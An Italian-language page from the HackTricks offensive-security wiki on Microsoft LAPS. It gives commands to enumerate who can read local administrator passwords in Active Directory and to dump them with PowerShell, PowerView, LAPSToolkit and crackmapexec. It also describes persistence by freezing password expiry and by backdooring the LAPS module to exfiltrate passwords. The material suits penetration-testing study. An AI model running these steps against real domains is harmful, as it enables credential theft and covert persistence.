# LAPS

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Informazioni di base

Local Administrator Password Solution (LAPS) è uno strumento utilizzato per gestire un sistema in cui le **password degli amministratori**, che sono **univoche, casuali e cambiate frequentemente**, vengono applicate ai computer associati al dominio. Queste password vengono memorizzate in modo sicuro all'interno di Active Directory e sono accessibili solo agli utenti a cui è stata concessa l'autorizzazione tramite le Access Control Lists (ACL). La sicurezza delle trasmissioni delle password dal client al server è garantita dall'utilizzo di **Kerberos versione 5** e **Advanced Encryption Standard (AES)**.

Negli oggetti computer del dominio, l'implementazione di LAPS comporta l'aggiunta di due nuovi attributi: **`ms-mcs-AdmPwd`** e **`ms-mcs-AdmPwdExpirationTime`**. Questi attributi memorizzano rispettivamente la **password dell'amministratore in testo normale** e il **tempo di scadenza**.

### Verifica se attivato
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Accesso alla password LAPS

È possibile **scaricare la policy LAPS grezza** da `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e quindi utilizzare **`Parse-PolFile`** dal pacchetto [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) per convertire questo file in un formato leggibile dall'essere umano.

Inoltre, è possibile utilizzare i **cmdlet nativi di PowerShell di LAPS** se sono installati su una macchina a cui abbiamo accesso:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** può essere utilizzato anche per scoprire **chi può leggere la password e leggerla**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Il [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita l'enumerazione di LAPS con diverse funzioni.\
Una di queste è l'analisi dei **`ExtendedRights`** per **tutti i computer con LAPS abilitato**. Questo mostrerà i **gruppi** specificamente **delegati alla lettura delle password LAPS**, che spesso sono utenti in gruppi protetti.\
Un **account** che ha **unito un computer** a un dominio riceve `All Extended Rights` su quel computer, e questo diritto dà all'**account** la capacità di **leggere le password**. L'enumerazione può mostrare un account utente che può leggere la password LAPS su un computer. Questo può aiutarci a **individuare utenti specifici di AD** che possono leggere le password LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**
Se non si ha accesso a PowerShell, è possibile sfruttare questo privilegio in remoto tramite LDAP utilizzando
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Questo permetterà di ottenere tutte le password che l'utente può leggere, consentendoti di ottenere un punto di appoggio migliore con un utente diverso.

## **Persistenza LAPS**

### **Data di scadenza**

Una volta ottenuti i privilegi di amministratore, è possibile **ottenere le password** e **impedire** a una macchina di **aggiornare** la sua **password** impostando la data di scadenza nel futuro.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
La password verrà comunque reimpostata se un **amministratore** utilizza il cmdlet **`Reset-AdmPwdPassword`**; o se è abilitata l'opzione **Non consentire un tempo di scadenza della password più lungo di quanto richiesto dalla policy** nella GPO di LAPS.
{% endhint %}

### Backdoor

Il codice sorgente originale di LAPS può essere trovato [qui](https://github.com/GreyCorbel/admpwd), quindi è possibile inserire un backdoor nel codice (ad esempio all'interno del metodo `Get-AdmPwdPassword` in `Main/AdmPwd.PS/Main.cs`) che in qualche modo **esfiltrerà le nuove password o le memorizzerà da qualche parte**.

Successivamente, basta compilare la nuova `AdmPwd.PS.dll` e caricarla sulla macchina in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e modificare l'ora di modifica).

## Riferimenti
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al repository [hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
